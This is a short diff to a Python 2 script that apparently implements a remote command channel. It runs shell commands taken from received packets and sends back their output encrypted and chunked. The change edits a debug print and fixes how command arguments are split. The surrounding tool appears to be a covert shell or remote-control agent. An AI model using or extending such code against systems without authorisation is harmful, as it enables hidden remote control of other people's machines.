@@ -133,8 +133,9 @@ def shellCommand(packet,command):
 	stdout, stderr = process.communicate()
 	#Concatenate the shell output to a variable prepped to send back to client.
 	data = stdout + stderr
+	
+	print "Command Executed: " + command
 
-	print "Sending Reponse: \n" + data
 	encryptedData = encryption.encryption(data)
 	encryptedData = helpers.chunkString(2, encryptedData)
 				
@@ -197,7 +198,7 @@ def runCmd(packet):
 			
 			#split the command
 			try:
-				commandType, commandString = command.split(' ')
+				commandType, commandString = command.split(' ',1)
 			#if the command has only one command
 			except ValueError:
 				commandType = command
